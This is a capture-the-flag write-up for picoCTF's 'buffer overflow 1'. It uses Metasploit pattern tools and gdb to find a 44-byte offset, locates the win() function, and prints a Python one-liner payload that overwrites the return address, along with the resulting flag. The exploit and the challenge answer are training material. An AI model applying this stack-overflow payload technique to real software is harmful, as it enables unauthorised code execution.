# buffer overflow 1
## Description
>Okay now you're cooking! This time can you overflow the buffer and return to
>the flag function in this
>[program](https://2018shell.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln)? You can find it in /problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709 on the shell server.
## Solution
[Metasploit](https://github.com/rapid7/metasploit-framework) has a few tools
called pattern_create.rb and pattern_offset.rb that make this challenge
relatively easy.

First create a pattern:
***
    $ ./pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
***
Then execute the program in gdb, using the pattern as the input:
***
    $ gdb vuln
    (gdb) run
    Please enter your string:
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    Okay, time to return... Fingers Crossed... Jumping to 0x35624134

    Program received signal SIGSEGV, Segmentation fault.
    0x35624134
***
Great! You were able to crash the program. Now use the address 0x35624134 with
pattern offset to find where in our input it crashed:
***
    $ ./pattern_offset.rb -q 0x35624134
    [*] Exact match at offset 44
***
Perfect, so now we know the program will crash if we give it input of 44
characters or more. Now we just need to figure out the address of the win()
function. To do this I simply opened up vuln in Ghidra, but you can also use
objdump, r2, IDA, etc. I was able to find that the address of the in() function
is 0x080485cb. Keeping in mind the endianness of this address, we can now
contruct our payload and deliver it to the vulnerable program:
***
    $ python -c "print('A' * 44 + '\xcb\x85\x04\x08')" | ./vuln
    Please enter your string:
    Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
    picoCTF{addr3ss3s_ar3_3asyd69e032d}
***

